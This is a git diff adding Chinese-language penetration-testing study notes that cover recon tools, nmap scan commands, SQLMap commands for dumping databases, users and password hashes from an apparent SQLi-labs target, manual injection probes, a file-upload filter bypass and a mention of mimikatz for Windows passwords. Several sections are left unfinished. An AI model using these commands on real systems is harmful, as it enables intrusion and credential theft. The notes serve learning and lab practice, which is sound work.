@@ -1,3 +1,12 @@
+"""
+常用工具
+http代理:fiddler,burpsuite,mitmproxy
+漏洞扫描:AWVS,Nmap
+漏洞利用:SQLMap,metasploit,hydra(爆破)
+抓包工具:wireshark,tcpdump
+内网渗透:cobaltstrike,mimikatz(明文抓取window密码)
+"""
+
 # 一.信息收集
 # 1.whois
 kali whois
@@ -10,7 +19,16 @@ subDomainsBrute
 Sublist3r
 # https://codeload.github.com/aboul3la/Sublist3r/zip/master
 # 3.端口扫描
-Nmap
+Nmap  -T4 -A  -v ip
+T4:时序(0-5)级别越高，速度越快,-A:使用进攻性方式扫描
+nmap ip -p 21                   # 指定端口
+nmap --traceroute 192.168.8.28  # 目标地址路由跟踪
+nmap -sP 192.168.9.0/24         # 地址在线状况
+nmap -O 192.168.9.27            # 目标地址操作系统
+nmap -sV 192.168.9.27           # 服务版本检测
+# 实战中 利用FIN 扫描的方式探测防火墙的状态。 FIN扫描用于识别端口是否关闭，收到RST 回复说明该端口关闭，否则就是 open或filtered状态
+nmap -sF -T4 192.168.9.99
+nmap --script=常见脚本  ip
 Masscan
 ZMap
 御剑高速TCP端口扫描工具
@@ -26,3 +44,34 @@ www.ip138.com
 DirBuster
 御剑后台扫描珍藏版
 wwwscan
+# 7.SQLMap
+注入漏洞产生条件:1.参数用户可控,2.
+注入点类型判断:1.有无回显,2.注入点参数(数字型，字符型)
+
+# 判断是否存在注入
+sqlmap.py -u ” http://192.168.1.104/sqll/Less-1/?id=l&uid=2 ” # 后面多个参数用""
+sqlmap.py -r   1.txt
+# 手动注入方式
+1.id=1 and 1=1 或者 id=1 and 1=2    # 判断返回结果是否相同
+2.id=1 order by (1-99)
+3.
+
+# 存在注入后,查询当前用户所有的数据库
+sqlmap.py -u  http://192.168.1.104/sqll/Less 1/?id=1 --dbs
+-D ans --tables
+-D ans -T ans_user --columns
+--users
+--passwords
+
+# md5、sha1等全球通用公开的加密算法进行反向查询
+https://www.cmd5.com/
+# 8. burpsuite
+
+# 9.xss漏洞(Cross-Site Scripting 跨站脚本攻击)：反射型,存储型,DOM型
+
+
+#10.文件上传漏洞
+JS检测绕过:1.浏览器插件,删除检测文件后缀的JS代码,2.抓包,改成可执行文件后缀在上传
+
+
+#11.WAF(软件型,硬件型,云WAF,网站系统内置WAF(系统中的内置过滤))
